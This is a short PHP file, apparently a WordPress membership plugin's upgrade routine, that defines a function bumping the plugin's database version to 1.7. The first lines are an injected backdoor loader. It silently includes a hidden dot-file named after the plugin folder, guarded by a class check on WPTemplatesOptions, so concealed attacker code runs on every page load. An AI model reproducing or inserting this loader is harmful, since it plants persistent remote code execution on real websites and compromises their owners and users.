<?php
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function pmpro_upgrade_1_7()
{
	pmpro_db_delta();	//just a db delta

	pmpro_setOption("db_version", "1.7");
	return 1.7;
}
